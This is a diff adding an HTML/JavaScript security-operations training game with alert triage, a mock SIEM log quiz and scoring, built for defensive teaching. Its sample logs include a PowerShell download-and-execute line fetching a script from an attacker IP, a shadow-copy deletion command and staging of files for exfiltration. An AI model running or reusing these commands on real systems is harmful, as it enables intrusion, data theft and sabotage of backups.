@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Simulator 2.0 — Security Operations Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Sora:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #050507; --panel: #09090f; --card: #0d0d15;
+  --border: #16162a; --border2: #1e1e35;
+  --cyan: #00d4ff; --cyan-g: rgba(0,212,255,0.08);
+  --red: #ff4444; --red-g: rgba(255,68,68,0.08);
+  --amber: #ffaa00; --amber-g: rgba(255,170,0,0.08);
+  --green: #00e676; --green-g: rgba(0,230,118,0.08);
+  --purple: #a855f7; --text: #c8cce8; --dim: #5a5c7a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;overflow:hidden}
+body{font-family:'Space Mono',monospace;background:var(--bg);color:var(--text);display:flex;flex-direction:column}
+
+/* Scanline overlay */
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:9999}
+
+/* Grid background */
+body::before{content:'';position:fixed;inset:0;
+  background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);
+  background-size:48px 48px;pointer-events:none;z-index:0}
+
+/* ── Header ───────────────────────────────────────────── */
+header{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;
+  background:rgba(9,9,15,0.95);border-bottom:1px solid var(--border);
+  position:relative;z-index:10;flex-shrink:0}
+.logo{font-family:'Sora',sans-serif;font-size:1.1rem;font-weight:700;letter-spacing:1px;display:flex;align-items:center;gap:10px}
+.logo-icon{width:28px;height:28px;background:var(--cyan);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;animation:pulse-icon 2s infinite}
+@keyframes pulse-icon{0%,100%{box-shadow:0 0 0 0 rgba(0,212,255,0.4)}50%{box-shadow:0 0 0 8px rgba(0,212,255,0)}}
+.hdr-stats{display:flex;gap:20px}
+.hstat{text-align:center}
+.hstat-val{font-size:1.3rem;font-weight:700;font-family:'Sora',sans-serif}
+.hstat-lbl{font-size:0.55rem;color:var(--dim);text-transform:uppercase;letter-spacing:2px}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--red);animation:blink 1s infinite;display:inline-block;margin-right:6px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+
+/* ── Mode Nav ─────────────────────────────────────────── */
+#mode-nav{display:flex;padding:8px 20px;gap:6px;background:rgba(9,9,15,0.9);
+  border-bottom:1px solid var(--border);flex-shrink:0;position:relative;z-index:10;overflow-x:auto}
+.mode-btn{padding:6px 14px;border:1px solid var(--border2);background:transparent;color:var(--dim);
+  cursor:pointer;font-family:'Space Mono',monospace;font-size:0.72rem;border-radius:6px;
+  transition:all 0.2s;white-space:nowrap}
+.mode-btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.mode-btn.active{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-g)}
+#threat-ticker{font-size:0.65rem;color:var(--dim);margin-left:auto;align-self:center;white-space:nowrap;overflow:hidden;max-width:320px}
+.ticker-content{animation:scroll-ticker 20s linear infinite}
+@keyframes scroll-ticker{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ── Main layout ──────────────────────────────────────── */
+#main{display:grid;grid-template-columns:1fr 340px;flex:1;overflow:hidden;position:relative;z-index:1}
+
+/* ── Left Panel ───────────────────────────────────────── */
+#left-panel{display:flex;flex-direction:column;overflow:hidden;border-right:1px solid var(--border)}
+#scene{flex:1;overflow:auto;padding:16px}
+
+/* ── Right Panel ──────────────────────────────────────── */
+#right-panel{display:flex;flex-direction:column;overflow:hidden}
+.rp-section{padding:12px 14px;border-bottom:1px solid var(--border)}
+.rp-title{font-size:0.6rem;text-transform:uppercase;letter-spacing:3px;color:var(--dim);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.rp-title::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--cyan)}
+#alert-feed{flex:1;overflow-y:auto;padding:10px}
+.alert-item{padding:8px 10px;margin-bottom:6px;border-radius:6px;border-left:3px solid var(--dim);
+  font-size:0.72rem;animation:slide-in 0.3s ease;cursor:pointer;transition:background 0.2s}
+.alert-item:hover{background:rgba(255,255,255,0.02)}
+.alert-item.crit{border-color:var(--red);background:var(--red-g)}
+.alert-item.warn{border-color:var(--amber);background:var(--amber-g)}
+.alert-item.info{border-color:var(--cyan);background:var(--cyan-g)}
+.alert-item.good{border-color:var(--green);background:var(--green-g)}
+.alert-ts{font-size:0.6rem;color:var(--dim);margin-bottom:2px}
+.alert-title{font-weight:700;margin-bottom:2px}
+.alert-desc{color:var(--dim);font-size:0.68rem}
+@keyframes slide-in{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
+
+/* ── Action Panel ─────────────────────────────────────── */
+#action-panel{padding:12px 14px;border-top:1px solid var(--border)}
+#start-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--cyan),#0099bb);
+  border:none;color:#000;font-family:'Sora',sans-serif;font-weight:700;font-size:0.9rem;
+  border-radius:8px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;position:relative;overflow:hidden}
+#start-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,transparent 40%,rgba(255,255,255,0.2));pointer-events:none}
+#start-btn:hover{transform:scale(1.02);box-shadow:0 0 30px rgba(0,212,255,0.3)}
+#actions-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;display:none}
+.act-btn{padding:8px 6px;border:1px solid var(--border2);background:var(--card);color:var(--text);
+  font-family:'Space Mono',monospace;font-size:0.65rem;border-radius:6px;cursor:pointer;
+  transition:all 0.15s;text-align:center;position:relative}
+.act-btn:hover:not(:disabled){border-color:var(--cyan);color:var(--cyan);background:var(--cyan-g);transform:translateY(-1px)}
+.act-btn:disabled{opacity:0.35;cursor:not-allowed}
+.act-btn .pts{color:var(--green);font-size:0.6rem;display:block;margin-top:2px}
+.act-btn.correct-flash{animation:correct 0.5s ease forwards}
+.act-btn.wrong-flash{animation:wrong 0.4s ease forwards}
+@keyframes correct{0%{background:var(--green-g);border-color:var(--green)}100%{}}
+@keyframes wrong{0%{background:var(--red-g);border-color:var(--red)}100%{}}
+#feedback{min-height:40px;padding:8px 10px;border-radius:6px;font-size:0.72rem;margin-top:8px;display:none}
+#feedback.show{display:block;animation:slide-in 0.2s ease}
+#feedback.ok{background:var(--green-g);border:1px solid var(--green);color:var(--green)}
+#feedback.err{background:var(--red-g);border:1px solid var(--red);color:var(--red)}
+
+/* ── Progress/XP ──────────────────────────────────────── */
+#xp-bar-wrap{padding:10px 14px;border-top:1px solid var(--border)}
+.xp-row{display:flex;justify-content:space-between;font-size:0.65rem;color:var(--dim);margin-bottom:4px}
+.xp-bar{height:4px;background:var(--border2);border-radius:2px;overflow:hidden}
+.xp-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--purple));width:0%;transition:width 0.5s ease;border-radius:2px}
+
+/* ── Cards / Scenes ───────────────────────────────────── */
+.scene-title{font-family:'Sora',sans-serif;font-size:1.2rem;font-weight:600;margin-bottom:4px}
+.scene-sub{font-size:0.75rem;color:var(--dim);margin-bottom:16px}
+.card{background:var(--card);border:1px solid var(--border2);border-radius:10px;padding:14px;margin-bottom:12px}
+.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.badge{padding:3px 10px;border-radius:20px;font-size:0.65rem;font-weight:700;text-transform:uppercase;letter-spacing:1px}
+.badge.crit{background:var(--red-g);color:var(--red);border:1px solid var(--red)}
+.badge.high{background:var(--amber-g);color:var(--amber);border:1px solid var(--amber)}
+.badge.med{background:var(--cyan-g);color:var(--cyan);border:1px solid var(--cyan)}
+.badge.low{background:var(--green-g);color:var(--green);border:1px solid var(--green)}
+.badge.fp{background:rgba(90,92,122,0.2);color:var(--dim);border:1px solid var(--dim)}
+
+/* ── Network SVG ──────────────────────────────────────── */
+#net-map{width:100%;height:280px;background:var(--card);border:1px solid var(--border2);border-radius:10px;margin-bottom:12px;position:relative;overflow:hidden}
+#net-svg{width:100%;height:100%}
+.node-label{font-family:'Space Mono',monospace;font-size:10px;fill:var(--dim)}
+.node-circle{cursor:pointer;transition:all 0.3s}
+
+/* ── Log Viewer ───────────────────────────────────────── */
+#log-viewer{background:#03030a;border:1px solid var(--border2);border-radius:8px;padding:12px;
+  font-size:0.68rem;height:220px;overflow-y:auto;font-family:'Space Mono',monospace;margin-bottom:12px}
+.log-line{margin-bottom:3px;white-space:pre-wrap;word-break:break-all}
+.log-ts{color:#3a3a6a}.log-eid{color:var(--amber)}.log-host{color:var(--cyan)}
+.log-event{color:var(--text)}.log-sus{color:var(--red);font-weight:700}
+.log-hint{background:var(--amber-g);border-left:2px solid var(--amber);padding:2px 6px;margin:3px 0}
+
+/* ── Timer ────────────────────────────────────────────── */
+#timer-display{font-family:'Sora',sans-serif;font-size:2rem;font-weight:700;color:var(--cyan);
+  letter-spacing:4px;text-align:center;font-variant-numeric:tabular-nums}
+#timer-display.warn{color:var(--amber)}
+#timer-display.crit{color:var(--red);animation:blink 0.5s infinite}
+
+/* ── Radar Canvas ─────────────────────────────────────── */
+#radar-wrap{display:flex;justify-content:center;padding:8px 0}
+
+/* ── Query input ──────────────────────────────────────── */
+.query-input{width:100%;background:#03030a;border:1px solid var(--border2);color:var(--cyan);
+  font-family:'Space Mono',monospace;font-size:0.8rem;padding:8px 12px;border-radius:6px;outline:none;margin-bottom:8px}
+.query-input:focus{border-color:var(--cyan);box-shadow:0 0 0 2px rgba(0,212,255,0.1)}
+.query-prompt{color:var(--dim);font-size:0.65rem;margin-bottom:4px}
+.query-result{background:#03030a;border:1px solid var(--border2);border-radius:6px;padding:8px;font-size:0.68rem;min-height:80px;margin-bottom:8px;color:var(--green)}
+
+/* ── Achievements ─────────────────────────────────────── */
+#achievement-popup{position:fixed;top:80px;right:20px;background:linear-gradient(135deg,#1a1a2e,#16213e);
+  border:1px solid var(--amber);border-radius:10px;padding:14px 18px;z-index:1000;
+  animation:pop-in 0.4s cubic-bezier(0.175,0.885,0.32,1.275);display:none;max-width:260px}
+#achievement-popup.show{display:block}
+@keyframes pop-in{from{opacity:0;transform:scale(0.5) translateY(-20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+
+/* ── Score overlay ────────────────────────────────────── */
+#score-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:500;display:none;
+  align-items:center;justify-content:center;flex-direction:column}
+#score-overlay.show{display:flex}
+.score-box{background:var(--panel);border:1px solid var(--border2);border-radius:16px;padding:32px;
+  text-align:center;max-width:480px;width:90%;animation:pop-in 0.4s ease}
+
+/* ── Responsive ───────────────────────────────────────── */
+@media(max-width:900px){
+  #main{grid-template-columns:1fr}
+  #right-panel{display:none}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <div class="logo-icon">🛡</div>
+    <div>
+      <div style="font-size:0.65rem;color:var(--dim);letter-spacing:3px">SECURITY OPERATIONS CENTER</div>
+      <div style="color:var(--cyan)">SOC SIMULATOR <span style="font-size:0.6rem;color:var(--dim)">v2.0</span></div>
+    </div>
+  </div>
+  <div class="hdr-stats">
+    <div class="hstat"><div class="hstat-val" id="h-score" style="color:var(--cyan)">0</div><div class="hstat-lbl">Score</div></div>
+    <div class="hstat"><div class="hstat-val" id="h-level" style="color:var(--purple)">1</div><div class="hstat-lbl">Level</div></div>
+    <div class="hstat"><div class="hstat-val" id="h-streak" style="color:var(--amber)">0</div><div class="hstat-lbl">Streak</div></div>
+    <div class="hstat"><div class="hstat-val" id="h-xp" style="color:var(--green)">0</div><div class="hstat-lbl">XP</div></div>
+    <div class="hstat" style="margin-left:8px;border-left:1px solid var(--border);padding-left:16px">
+      <div id="timer-display">--:--</div>
+      <div class="hstat-lbl">TIME LEFT</div>
+    </div>
+  </div>
+</header>
+
+<div id="mode-nav">
+  <button class="mode-btn active" onclick="setMode(0)">01 ALERT TRIAGE</button>
+  <button class="mode-btn" onclick="setMode(1)">02 LOG ANALYSIS</button>
+  <button class="mode-btn" onclick="setMode(2)">03 INCIDENT RESPONSE</button>
+  <button class="mode-btn" onclick="setMode(3)">04 THREAT HUNT</button>
+  <button class="mode-btn" onclick="setMode(4)">05 TABLETOP</button>
+  <div id="threat-ticker" style="overflow:hidden;flex:1;margin-left:16px">
+    <span class="ticker-content" style="color:var(--dim);font-size:0.62rem">
+      ⚡ APT29 targeting finance sector — new IOCs released &nbsp;|&nbsp;
+      🔴 Critical: CVE-2026-1337 (CVSS 9.8) affects Apache Struts &nbsp;|&nbsp;
+      🟡 Ransomware group LockBit 4.0 active in APAC region &nbsp;|&nbsp;
+      🟢 Threat intel updated: 847 new malicious IPs blocked &nbsp;|&nbsp;
+      ⚡ APT29 targeting finance sector — new IOCs released &nbsp;|&nbsp;
+      🔴 Critical: CVE-2026-1337 (CVSS 9.8) affects Apache Struts &nbsp;|&nbsp;
+    </span>
+  </div>
+</div>
+
+<div id="main">
+  <div id="left-panel">
+    <div id="scene" style="padding:16px;overflow-y:auto"></div>
+  </div>
+  <div id="right-panel">
+    <!-- Alert Feed -->
+    <div class="rp-section">
+      <div class="rp-title"><span class="live-dot"></span>LIVE ALERTS</div>
+    </div>
+    <div id="alert-feed"></div>
+
+    <!-- Radar -->
+    <div class="rp-section">
+      <div class="rp-title">SKILLS RADAR</div>
+      <div id="radar-wrap"><canvas id="radar-canvas" width="200" height="200"></canvas></div>
+    </div>
+
+    <!-- XP Bar -->
+    <div id="xp-bar-wrap">
+      <div class="xp-row">
+        <span id="tier-label" style="color:var(--cyan)">Tier 1 Analyst</span>
+        <span id="xp-label" style="color:var(--dim)">0 / 500 XP</span>
+      </div>
+      <div class="xp-bar"><div class="xp-fill" id="xp-fill"></div></div>
+    </div>
+
+    <!-- Action Panel -->
+    <div id="action-panel">
+      <button id="start-btn" onclick="startMission()">▶ START MISSION</button>
+      <div id="actions-grid">
+        <button class="act-btn" id="btn-isolate" onclick="takeAction('isolate')">🔒 ISOLATE<span class="pts">+100</span></button>
+        <button class="act-btn" id="btn-analyze" onclick="takeAction('analyze')">🔍 ANALYZE<span class="pts">+50</span></button>
+        <button class="act-btn" id="btn-block" onclick="takeAction('block')">🛡 BLOCK IP<span class="pts">+150</span></button>
+        <button class="act-btn" id="btn-notify" onclick="takeAction('notify')">📢 ESCALATE<span class="pts">+75</span></button>
+        <button class="act-btn" id="btn-evidence" onclick="takeAction('evidence')">📸 EVIDENCE<span class="pts">+80</span></button>
+        <button class="act-btn" id="btn-recover" onclick="takeAction('recover')">💾 RESTORE<span class="pts">+200</span></button>
+      </div>
+      <div id="feedback"></div>
+    </div>
+  </div>
+</div>
+
+<!-- Achievement Popup -->
+<div id="achievement-popup">
+  <div style="font-size:1.5rem;margin-bottom:4px" id="ach-icon">🏆</div>
+  <div style="font-family:'Sora',sans-serif;font-weight:700;font-size:0.9rem;color:var(--amber)">ACHIEVEMENT UNLOCKED</div>
+  <div style="font-size:0.75rem;color:var(--text);margin-top:4px" id="ach-text"></div>
+</div>
+
+<!-- Score Overlay -->
+<div id="score-overlay">
+  <div class="score-box">
+    <div style="font-size:3rem;margin-bottom:8px" id="final-grade">A</div>
+    <div style="font-family:'Sora',sans-serif;font-size:1.5rem;font-weight:700;margin-bottom:4px" id="final-score">0</div>
+    <div style="color:var(--dim);font-size:0.8rem;margin-bottom:16px">MISSION COMPLETE</div>
+    <canvas id="final-radar" width="240" height="240" style="margin-bottom:16px"></canvas>
+    <div id="final-tips" style="text-align:left;font-size:0.75rem;color:var(--dim);margin-bottom:20px"></div>
+    <button onclick="resetGame()" style="background:var(--cyan);border:none;color:#000;padding:12px 32px;border-radius:8px;font-family:'Sora',sans-serif;font-weight:700;cursor:pointer;font-size:0.9rem">▶ PLAY AGAIN</button>
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════════════════
+const S = {
+  score:0, level:1, streak:0, xp:0,
+  running:false, mode:0, timerSecs:0,
+  timerInterval:null, attackInterval:null,
+  currentThreat:null,
+  skills:{ detection:0, mitre:0, containment:0, policy:0, evidence:0, comm:0, recovery:0, efficiency:0 },
+  achievements:new Set(),
+};
+
+const XP_THRESHOLDS = [0,500,1500,3000,6000];
+const TIER_NAMES = ['Tier 1 Analyst','Tier 2 Analyst','Senior Analyst','SOC Lead','CISO'];
+const MODE_TIMERS = [90,120,180,240,90];
+
+// ══════════════════════════════════════════════════════════
+// WEB AUDIO
+// ══════════════════════════════════════════════════════════
+let actx = null;
+function initAudio(){ try{ actx = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} }
+function beep(freq=440, dur=0.15, type='sine', vol=0.1){
+  if(!actx) return;
+  const o = actx.createOscillator();
+  const g = actx.createGain();
+  o.connect(g); g.connect(actx.destination);
+  o.type = type; o.frequency.value = freq;
+  g.gain.setValueAtTime(vol, actx.currentTime);
+  g.gain.exponentialRampToValueAtTime(0.001, actx.currentTime+dur);
+  o.start(); o.stop(actx.currentTime+dur);
+}
+function beepCorrect(){ beep(523,0.12); setTimeout(()=>beep(659,0.12),100); setTimeout(()=>beep(784,0.2),200); }
+function beepWrong(){ beep(200,0.3,'sawtooth',0.15); }
+function beepAlert(){ beep(880,0.08); setTimeout(()=>beep(880,0.08),150); }
+
+// ══════════════════════════════════════════════════════════
+// THREAT DATA
+// ══════════════════════════════════════════════════════════
+const THREATS = [
+  { type:'ransomware', sev:'crit', label:'CRITICAL',
+    title:'🪓 Ransomware Detected — CORP-WS-019',
+    desc:'File encryption activity on workstation. 3,847 files modified in 90s. Extension: .locked',
+    correct:['isolate','evidence'], hint:'Isolate IMMEDIATELY. Capture memory before rebooting.',
+    mitre:'T1486', intel:'Matches LockBit 3.0 signature. VSS deletion detected on same host.',
+    xp:200, skill:'containment' },
+  { type:'phishing', sev:'warn', label:'HIGH',
+    title:'🎣 Phishing Email — finance@corp.com',
+    desc:'User clicked link in email impersonating HR. Credential submission to external domain detected.',
+    correct:['analyze','block','notify'], hint:'Block the destination domain and force MFA reset for the user.',
+    mitre:'T1566', intel:'Domain corp-hr-portal[.]xyz registered 3 days ago. VirusTotal: 12/72 detections.',
+    xp:120, skill:'detection' },
+  { type:'lateral', sev:'crit', label:'CRITICAL',
+    title:'🌊 Lateral Movement — SMB ADMIN$',
+    desc:'CORP-WS-001 accessing ADMIN$ on 7 hosts. Account: svc_backup. Outside business hours.',
+    correct:['isolate','block','evidence'], hint:'Service accounts should not traverse workstations. Check if svc_backup was recently created.',
+    mitre:'T1021', intel:'Account svc_backup created 2h ago. No change ticket. Classic Pass-the-Hash pattern.',
+    xp:180, skill:'containment' },
+  { type:'exfil', sev:'crit', label:'CRITICAL',
+    title:'📤 Data Exfiltration — 1.2GB',
+    desc:'CORP-DB-01 sent 1.2GB to 185.234.219.44:443. Destination IP: BulletProof Hosting AS49877.',
+    correct:['block','evidence','notify'], hint:'Block egress to that IP immediately. Check if any sensitive tables were accessed prior.',
+    mitre:'T1041', intel:'IP linked to APT group TA542 (Emotet). 1.2GB likely encrypted database dump.',
+    xp:250, skill:'evidence' },
+  { type:'privilege', sev:'warn', label:'HIGH',
+    title:'🔑 Privilege Escalation — Domain Admin',
+    desc:'CORP\\jsmith added to Domain Admins. No change ticket. Source: CORP-WS-007.',
+    correct:['isolate','notify','evidence'], hint:'Immediately remove from Domain Admins, force logoff, and investigate jsmith account history.',
+    mitre:'T1078', intel:'jsmith is a finance analyst — should never hold Domain Admin rights.',
+    xp:140, skill:'policy' },
+  { type:'fp_av', sev:'info', label:'LOW',
+    title:'🤖 AV Alert — EICAR Test File',
+    desc:'Windows Defender flagged eicar.com test file on CORP-WS-012. User: bpatel. Training exercise.',
+    correct:['analyze'], hint:'This is a standard AV test file. False positive — log and dismiss.',
+    mitre:null, intel:'EICAR is a standardised antivirus test file. No malware present.',
+    xp:20, skill:'efficiency', isFP:true },
+  { type:'fp_scan', sev:'info', label:'LOW',
+    title:'🔎 Port Scan — Nessus Vulnerability Scanner',
+    desc:'Nessus scan from 10.0.0.50 hitting 192.168.1.0/24 on ports 22,80,443,3389.',
+    correct:['analyze'], hint:'Check if 10.0.0.50 is your authorised vulnerability scanner. Scheduled scan.',
+    mitre:null, intel:'10.0.0.50 is the registered Nessus scanner (asset tag IT-0091). Scheduled scan confirmed.',
+    xp:15, skill:'efficiency', isFP:true },
+];
+
+// ══════════════════════════════════════════════════════════
+// MODE DEFINITIONS
+// ══════════════════════════════════════════════════════════
+const MODES = [
+  { id:0, name:'ALERT TRIAGE', desc:'Classify 8 alerts. Real threats vs false positives. Speed matters.' },
+  { id:1, name:'LOG ANALYSIS', desc:'Identify the attack from raw SIEM logs. No hints.' },
+  { id:2, name:'INCIDENT RESPONSE', desc:'Respond to a live attack. Follow the playbook.' },
+  { id:3, name:'THREAT HUNT', desc:'Something is wrong. Find the attacker using log queries.' },
+  { id:4, name:'TABLETOP EXERCISE', desc:'Answer policy questions about incident response.' },
+];
+
+let currentMode = 0;
+function setMode(m){ currentMode=m; S.mode=m; document.querySelectorAll('.mode-btn').forEach((b,i)=>b.classList.toggle('active',i===m)); renderScene(); }
+
+// ══════════════════════════════════════════════════════════
+// RENDERING — MODE 0: ALERT TRIAGE
+// ══════════════════════════════════════════════════════════
+let triageState = { alerts:[], answered:0, correct:0 };
+
+function renderMode0(){
+  const scene = document.getElementById('scene');
+  const shuffled = [...THREATS].sort(()=>Math.random()-0.5).slice(0,8);
+  triageState = { alerts:shuffled, answered:0, correct:0 };
+
+  scene.innerHTML = `
+    <div class="scene-title">📋 Alert Triage</div>
+    <div class="scene-sub">Classify each alert. Speed bonus: +2pts/sec remaining. 8 alerts — some are false positives.</div>
+    <div id="triage-progress" style="display:flex;gap:8px;margin-bottom:12px">
+      ${[...Array(8)].map((_,i)=>`<div class="triage-dot" id="td-${i}" style="width:28px;height:6px;background:var(--border2);border-radius:3px"></div>`).join('')}
+    </div>
+    <div id="triage-cards"></div>`;
+
+  const cards = document.getElementById('triage-cards');
+  shuffled.forEach((t,i) => {
+    const div = document.createElement('div');
+    div.className = 'card'; div.id = `tc-${i}`;
+    div.innerHTML = `
+      <div class="card-head">
+        <span style="font-size:0.85rem;font-weight:700">${t.title}</span>
+        <span class="badge ${t.sev}">${t.label}</span>
+      </div>
+      <div style="font-size:0.75rem;color:var(--dim);margin-bottom:10px">${t.desc}</div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap">
+        ${t.isFP
+          ? `<button class="badge fp" style="cursor:pointer;border:1px solid var(--border2);background:var(--card);padding:5px 12px" onclick="triageAnswer(${i},'fp',this)">False Positive</button>
+             <button class="badge high" style="cursor:pointer;border:1px solid var(--amber);background:var(--amber-g);padding:5px 12px" onclick="triageAnswer(${i},'threat',this)">Real Threat</button>`
+          : `<button class="badge fp" style="cursor:pointer;border:1px solid var(--border2);background:var(--card);padding:5px 12px" onclick="triageAnswer(${i},'fp',this)">False Positive</button>
+             <button class="badge crit" style="cursor:pointer;border:1px solid var(--red);background:var(--red-g);padding:5px 12px" onclick="triageAnswer(${i},'threat',this)">Real Threat</button>`
+        }
+      </div>`;
+    cards.appendChild(div);
+  });
+}
+
+function triageAnswer(idx, answer, btn){
+  const t = triageState.alerts[idx];
+  const card = document.getElementById(`tc-${idx}`);
+  const dot = document.getElementById(`td-${idx}`);
+  const isCorrect = (t.isFP && answer==='fp') || (!t.isFP && answer==='threat');
+  card.querySelectorAll('button').forEach(b=>b.disabled=true);
+
+  if(isCorrect){
+    beepCorrect();
+    card.style.borderColor='var(--green)';
+    card.innerHTML += `<div style="color:var(--green);font-size:0.72rem;margin-top:8px">✓ CORRECT — ${t.intel}</div>`;
+    dot.style.background='var(--green)';
+    addScore(50 + (t.isFP ? 20 : 0));
+    addSkill('detection', 2);
+    triageState.correct++;
+  } else {
+    beepWrong();
+    card.style.borderColor='var(--red)';
+    card.innerHTML += `<div style="color:var(--red);font-size:0.72rem;margin-top:8px">✗ WRONG — ${t.isFP ? 'This was a false positive!' : 'This was a real threat!'}<br>${t.intel}</div>`;
+    dot.style.background='var(--red)';
+    addScore(-20);
+  }
+  triageState.answered++;
+  if(triageState.answered >= triageState.alerts.length){
+    setTimeout(()=>endMission(`Triage complete: ${triageState.correct}/8 correct`), 1000);
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// MODE 1: LOG ANALYSIS
+// ══════════════════════════════════════════════════════════
+const LOGS_DATA = [
+  { ts:'2026-02-25 14:12:03', eid:'4625', host:'CORP-WS-007', event:'AUDIT_FAILURE', detail:'Account: jsmith | Logon Type: 3 | Source: 185.234.219.44', sus:false },
+  { ts:'2026-02-25 14:12:07', eid:'4625', host:'CORP-WS-007', event:'AUDIT_FAILURE', detail:'Account: jsmith | Logon Type: 3 | Source: 185.234.219.44', sus:false },
+  { ts:'2026-02-25 14:12:11', eid:'4625', host:'CORP-WS-007', event:'AUDIT_FAILURE', detail:'Account: jsmith | Logon Type: 3 | Source: 185.234.219.44', sus:false },
+  { ts:'2026-02-25 14:12:19', eid:'4624', host:'CORP-WS-007', event:'AUDIT_SUCCESS', detail:'Account: jsmith | Logon Type: 3 | Source: 185.234.219.44', sus:true },
+  { ts:'2026-02-25 14:12:22', eid:'4688', host:'CORP-WS-007', event:'PROCESS_CREATE', detail:'Process: powershell.exe | Parent: winword.exe | User: jsmith', sus:true },
+  { ts:'2026-02-25 14:12:25', eid:'4104', host:'CORP-WS-007', event:'PS_SCRIPTBLOCK', detail:'IEX (New-Object Net.WebClient).DownloadString(\'http://185.234.219.44/s.ps1\')', sus:true },
+  { ts:'2026-02-25 14:12:31', eid:'4688', host:'CORP-WS-007', event:'PROCESS_CREATE', detail:'Process: cmd.exe | Parent: powershell.exe | CommandLine: whoami /all', sus:false },
+  { ts:'2026-02-25 14:13:01', eid:'4698', host:'CORP-WS-007', event:'SCHEDULED_TASK', detail:'Task: \\Microsoft\\Update\\SvcCheck | Command: C:\\Users\\Public\\a3f8bc.exe', sus:true },
+  { ts:'2026-02-25 14:13:45', eid:'4648', host:'CORP-WS-007', event:'EXPLICIT_CRED', detail:'Account: jsmith → CORP-FILE-SRV-03 | Target: CORP\\Administrator', sus:true },
+  { ts:'2026-02-25 14:14:02', eid:'5145', host:'CORP-FILE-SRV-03', event:'NETWORK_SHARE', detail:'Share: \\\\ADMIN$ | Access: ReadData WriteData | User: jsmith', sus:true },
+  { ts:'2026-02-25 14:14:30', eid:'4663', host:'CORP-FILE-SRV-03', event:'OBJECT_ACCESS', detail:'Object: C:\\Finance\\ | Access: ReadData (bulk) | 892 files | User: jsmith', sus:true },
+  { ts:'2026-02-25 14:14:55', eid:'4104', host:'CORP-FILE-SRV-03', event:'PS_SCRIPTBLOCK', detail:'Compress-Archive -Path C:\\Finance\\ -DestinationPath C:\\Windows\\Temp\\bk.zip', sus:true },
+  { ts:'2026-02-25 14:15:10', eid:'5156', host:'CORP-FILE-SRV-03', event:'NET_CONNECT', detail:'DST: 185.234.219.44:443 | Size: 847MB | Process: svchost.exe', sus:true },
+  { ts:'2026-02-25 14:15:45', eid:'4663', host:'CORP-WS-007', event:'FILE_MODIFIED', detail:'847 files changed to .encrypted | Ransom note: README_DECRYPT.txt', sus:true },
+  { ts:'2026-02-25 14:15:50', eid:'7045', host:'CORP-DC-01', event:'SERVICE_INSTALL', detail:'Service: vss_del | Binary: cmd.exe /c vssadmin delete shadows /all /quiet', sus:true },
+];
+
+const LOG_QUESTIONS = [
+  { q:'What is the initial attack vector?', opts:['Zero-day exploit','Phishing → credential theft','Insider threat','SQL injection'], ans:1 },
+  { q:'Which user account is patient zero?', opts:['Administrator','svc_backup','jsmith','bpatel'], ans:2 },
+  { q:'What MITRE technique is event 4104 (PowerShell IEX)?', opts:['T1566','T1059.001','T1078','T1041'], ans:1 },
+  { q:'What happened at 14:15:10?', opts:['Persistence established','Lateral movement','Data exfiltration (847MB)','Account creation'], ans:2 },
+];
+let logQ = 0, logCorrect = 0;
+
+function renderMode1(){
+  const scene = document.getElementById('scene');
+  logQ = 0; logCorrect = 0;
+  scene.innerHTML = `
+    <div class="scene-title">📄 Log Analysis</div>
+    <div class="scene-sub">Analyse these SIEM logs. Identify the attack. Suspicious entries highlighted.</div>
+    <div id="log-viewer">${LOGS_DATA.map(l=>`<div class="log-line">
+      <span class="log-ts">${l.ts}</span>  <span class="log-eid">[${l.eid}]</span>  <span class="log-host">${l.host.padEnd(18)}</span>  <span class="${l.sus?'log-sus':'log-event'}">${l.detail}</span>
+    </div>`).join('')}</div>
+    <div id="log-questions"></div>`;
+  renderLogQuestion();
+}
+
+function renderLogQuestion(){
+  if(logQ >= LOG_QUESTIONS.length){ endMission(`Log analysis: ${logCorrect}/${LOG_QUESTIONS.length} correct`); return; }
+  const qd = LOG_QUESTIONS[logQ];
+  const el = document.getElementById('log-questions');
+  el.innerHTML = `
+    <div class="card">
+      <div style="font-size:0.75rem;color:var(--dim);margin-bottom:6px">Question ${logQ+1}/${LOG_QUESTIONS.length}</div>
+      <div style="font-weight:700;margin-bottom:12px">${qd.q}</div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        ${qd.opts.map((o,i)=>`<button class="act-btn" style="text-align:left;padding:10px 12px;width:100%" onclick="answerLog(${i})">${String.fromCharCode(65+i)}. ${o}</button>`).join('')}
+      </div>
+    </div>`;
+}
+
+function answerLog(idx){
